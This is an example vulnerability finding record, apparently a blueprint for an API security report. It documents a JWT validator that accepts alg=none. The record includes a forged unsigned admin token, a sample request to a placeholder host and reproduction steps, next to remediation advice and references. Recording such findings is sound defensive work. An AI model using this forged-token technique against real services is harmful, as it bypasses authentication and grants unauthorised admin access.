# Example: JWT alg=none Finding Blueprint

```json
{
  "id": "APISEC-2026-002",
  "title": "JWT validator accepts alg=none, allowing arbitrary claim forgery",
  "severity": "critical",
  "confidence": "confirmed",
  "cwe": "CWE-347",
  "owasp": "API2:2023",
  "owasp_api_id": "API2:2023",
  "cvss": 9.1,
  "endpoint": "/api/v1/me",
  "http_method": "GET",
  "api_type": "rest",
  "auth_context": "unauthenticated",
  "evidence": {
    "jwt_header": "{\"alg\":\"none\",\"typ\":\"JWT\"}",
    "jwt_payload": "{\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}",
    "request": "GET /api/v1/me HTTP/1.1\nHost: target.tld\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
    "response": "HTTP/1.1 200 OK\n\n{\"sub\":\"admin\",\"role\":\"admin\"}"
  },
  "reproduction": [
    "Craft header {\"alg\":\"none\",\"typ\":\"JWT\"}.",
    "Craft payload with desired sub/role claims.",
    "Concatenate base64url(header) + '.' + base64url(payload) + '.' (empty signature).",
    "Send as Bearer to any authenticated endpoint; observe 200 with elevated identity."
  ],
  "remediation": "Configure JWT library to reject alg=none and enforce an allowlist of expected algorithms (e.g. RS256 only). Validate alg matches the key type before verifying.",
  "references": [
    "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
    "https://cwe.mitre.org/data/definitions/347.html",
    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
  ]
}
```
